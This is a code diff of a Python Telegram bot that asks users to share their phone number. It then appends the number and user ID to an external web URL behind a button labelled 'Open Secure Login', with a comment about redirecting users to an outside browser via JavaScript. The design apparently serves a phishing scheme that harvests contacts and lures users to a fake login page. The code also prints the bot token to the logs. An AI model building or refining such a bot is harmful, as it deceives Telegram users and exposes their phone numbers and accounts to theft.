@@ -1,24 +1,24 @@
+# bot.py
 import os
 import urllib.parse
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Railway env vars
+# Railway Environment Variables
 WEB_URL = os.getenv("WEB_URL")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-# DEBUG
+# DEBUG LOGS
 print(f"[DEBUG] WEB_URL = {WEB_URL}")
 print(f"[DEBUG] BOT_TOKEN = {BOT_TOKEN}")
 
+# VALIDATION
 if not BOT_TOKEN or len(BOT_TOKEN) < 30:
-    print("FATAL: BOT_TOKEN missing!")
+    print("FATAL: BOT_TOKEN is missing or invalid!")
     exit(1)
 if not WEB_URL:
-    print("FATAL: WEB_URL missing!")
+    print("FATAL: WEB_URL is missing!")
     exit(1)
-
-# Fake tg:// is no longer needed — we use InlineKeyboard
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[KeyboardButton("Share My Phone Number", request_contact=True)]]
@@ -36,13 +36,12 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     params = urllib.parse.urlencode({'user_id': user_id, 'phone': phone})
     final_url = f"{WEB_URL}?{params}"
 
-    # SEND MESSAGE + INLINE BUTTON → FORCES EXTERNAL BROWSER
+    # Button opens in-app — but we'll redirect externally via JS
     keyboard = [[InlineKeyboardButton("Open Secure Login", url=final_url)]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
-        "Opening secure login in your browser...\n"
-        "Please wait — do NOT close Telegram.",
+        "Secure login ready.\nTap below to continue:",
         reply_markup=reply_markup
     )
 
